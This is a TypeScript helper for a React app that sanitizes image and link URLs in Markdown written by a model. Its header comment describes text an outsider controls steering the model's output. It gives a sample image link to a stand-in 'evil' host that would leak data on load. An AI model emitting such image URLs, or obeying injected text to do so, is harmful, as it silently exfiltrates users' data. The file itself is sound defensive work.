import { defaultUrlTransform, type UrlTransform } from 'react-markdown';

/**
 * Application addition (readiness review 2026-10-07): Markdown written by a
 * model may come from text an outsider controls (a resume, an inbound mail, a
 * knowledge document). An image loads by itself, so `![](https://evil/?d=…)`
 * would send data to another host without anyone clicking. Images are
 * therefore rendered only from this application's origin (relative or
 * same-origin URLs, `blob:` of this origin) or as inline raster `data:`
 * images; anything else is shown as a link the reader can choose to open.
 * Links keep react-markdown's protocol allow-list (http, https, mailto, …),
 * so `javascript:` and similar never reach an `href`.
 */
const DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);/iu;

export function isSafeImageSrc(src: unknown): src is string {
  if (typeof src !== 'string') return false;
  const value = src.trim();
  if (!value) return false;
  if (DATA_IMAGE.test(value)) return true;
  // `//host/x` and `\\host\x` are other origins; browsers treat `\` as `/`.
  if (/^[\\/]{2}/u.test(value)) return false;
  if (typeof window === 'undefined') return false;
  try {
    const origin = window.location.origin;
    if (value.startsWith('blob:'))
      return new URL(value.slice(5)).origin === origin;
    const url = new URL(value, window.location.href);
    return (
      (url.protocol === 'http:' || url.protocol === 'https:') &&
      url.origin === origin
    );
  } catch {
    return false;
  }
}

/** react-markdown's default transform, plus inline raster images for `img` sources. */
export const safeMarkdownUrlTransform: UrlTransform = (url, key, node) => {
  if (key === 'src' && node.tagName === 'img' && DATA_IMAGE.test(url.trim())) {
    return url;
  }
  return defaultUrlTransform(url);
};
